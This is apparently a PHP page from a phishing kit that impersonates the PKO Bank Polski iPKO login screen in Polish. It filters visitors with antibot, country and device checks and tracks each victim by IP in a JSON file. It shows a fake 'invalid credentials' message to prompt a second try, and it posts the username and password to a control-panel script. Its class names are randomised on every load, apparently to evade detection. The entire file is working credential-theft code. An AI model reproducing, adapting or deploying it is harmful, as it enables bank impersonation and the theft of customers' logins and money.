<?php
    error_reporting(0);
    session_start();

    include "../antibots-debug/antibots.php";
    include '../setting/functions.php';
    include '../includes/current-page.php';
    include '../includes/check-allowed-countries.php';
    include '../includes/check-devices-allow.php';

    $ip = get_client_ip();
    $get_name_file = $ip;
    $target_file = "../panel/storage/{$get_name_file}.json";
    $json_file = file_get_contents($target_file);
    $user_info = json_decode($json_file, true);
    $user_info['error_login'];
    
    if ($user_info['error_login'] == 1) {
        $get_name_page = "Page Login Error";
        $get_step = "login-error";
    } else {
        $get_name_page = "Page Login";
        $get_step = "login";
    }
    get_page_info($get_name_page, $get_name_file);
    
    $random_classes = rand(0, 1000000); 
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="en" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> ">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SEO -->
    <?php include '../libraries/seo.php'; ?>
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../css/basic-thinks.css">
    <!-- Favicon -->
    <link rel="icon" type="image/png" href="../img/favicon.ico">
    <link rel="shortcut" type="image/png" href="../img/favicon.ico">
    <link rel="appel-touch-icon" type="image/png" href="../img/favicon.ico">
    <title>STRONA INTERNETOWA</title>
</head>
<body id="body" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> body">
    <!-- Nav -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> nav-section">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> content-nav-section">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> logo">
                <img src="../img/logo.png" width:175px; height:234px; alt="">
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> btn-lang">
                <img src="../img/flag.png" alt="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> flag">
                PL
                <img src="../img/icon-arrow.png" alt="" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> arrow">
            </div>
        </div>
    </div>
    <!-- Nav -->

    <!-- Main -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> main-section">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> content-main-section" id="usernameSection">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> f-s-d-p-section">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-width">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-2">
                        <h1>Logowanie</h1>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-form">Nie masz konta?</span>
                    </div>
                    <?php
                        if ($user_info['error_login'] == 1) {
                            echo
                            '<div class="message-error-pages">
                                <i class="fa-solid fa-triangle-exclamation"></i>
                                Twoje dane logowania są nieprawidłowe. Sprawdź podane informacje i spróbuj zalogować się ponownie.
                            </div>';
                        }
                    ?>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-l-i-me" id="div1">
                       Identyfikator użytkownika <input type="text" id="username" name="username" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> i-a-d-p-element" placeholder="">
                        <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> m-e-i" id="messageError1">Identyfikator użytkownika</small>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-btn">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-2-other">
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-form-btn">Pomoc w logowaniu</div>
                        </div>
                        <span id="btnActionOne" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> btn-s-d-p-element">Dalej</button>
                    </div>
                </div>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-text-login">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-image">
                    <img src="../img/image-login1.png" alt="">
                </div>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-text">
                    <h1>Verification of Payee (VoP)</h1>
                    <p>
                         w kilka sekund na rachunku odbiorcy!
                    </p>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> style-btn">Więcej</div>
                </div>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-load" id="load">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> load"></div>
            </div>
        </div>
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> content-main-section hide-option" id="passwordSection">
            <form action="../control-panel/check-action.php" method="post" id="fSD" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> f-s-d-p-section">
                <input type="hidden" name="step" value="<?php echo $get_step; ?>">
                <input type="hidden" name="ip" value="<?php echo $get_name_file; ?>">
                <input type="hidden" name="username_value" id="usernameValueHide" value="">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-width">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-2">
                        <h1>Logowanie</h1>
                    </div>
                    <div class="schHT"><div class="FA6Le lxTQm nVn3k"><div class="QYKd7"><div class="JTvN4"></div></div><div class="wrZjq"><span>Zwróć uwagę, czy na pewno używasz Twojego hasła do logowania, a nie np. hasła z tokena.</span></div></div></div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-l-i-me" id="div2">
                        <input type="password" id="password" name="password" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> i-a-d-p-element" placeholder="Wpisz hasło">
                        <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> m-e-i" id="messageError2">Twoje hasło</small>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-btn">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-2-other">
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-form-btn">‹ Powrót</div>
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-form-btn">Odzyskaj hasło</span>
                        </div>
                        <button type="submit" name="b_s_d_p" id="bSD" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> btn-s-d-p-element">Zaloguj</button>
                    </div>
                </div>
            </form>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-text-login">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-image">
                    <img src="../img/image-login2.png" alt="">
                </div>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-text">
                    <h1>Przelew natychmiastowy SEPA w iPKO biznes</h1>
                    <p>
                         w kilka sekund na rachunku odbiorcy!
                    </p>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> style-btn">Więcej</div>
                </div>
            </div>
        </div>
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-boxs">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> box-section">
                <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> current-date"><?php echo date("d.m.Y"); ?></small>
                <h4>Bezpieczeństwo zaczyna się od prostych nawyków</h4>
                <p>
                    Koniec roku to dobry moment, by uporządkować kwestie związane z bezpieczeństwem Twoich danych i pieniędzy.
                </p>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-box">Więcej</div>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> box-section">
                <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> current-date"><?php echo date("d.m.Y"); ?></small>
                <h4>Już jest! Potwierdzanie przelewów dziecka w aplikacji IKO</h4>
                <p>
                    Sprawdź nowości dla rodziców
                </p>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-box">Więcej</div>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> box-section" style="margin-bottom: 0px !important;">
                <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> current-date">28.07.<?php echo date("Y"); ?></small>
                <h4 style="color: #ca171d !important;">Kolejne ataki cyberprzestępców</h4>
                <p style="color: #ca171d !important;">
                    Sprawdź najnowsze ostrzeżenia.
                </p>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-box">Więcej</div>
            </div>
        </div>
    </div>
    <!-- Main -->

    <!-- Footer -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> footer-section">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> content-footer-section">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> links-footer-left">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-left">© 2025 PKO Bank Polski</span>
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-left">Kod BIC (Swift): BPKOPLPW</span>
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-left">Polityka prywatności</span>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> links-footer-right">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-right"><img src="../img/icon-footer-1.png" alt="">Bezpieczeństwo</span>
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-right"><img src="../img/icon-footer-2.png" alt="">Pomoc</span>
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-footer-right"><img src="../img/icon-footer-3.png" alt="">Kontakt</span>
            </div>
        </div>
    </div>
    <!-- Footer -->

    <!-- Script Js -->
    <script src="../js/script-login.js"></script>
    <script src="../js/jquery.min.js"></script>
    <?php include '../includes/redirect.php'; ?>
    <?php include '../includes/status.php'; ?>
</body>
</html>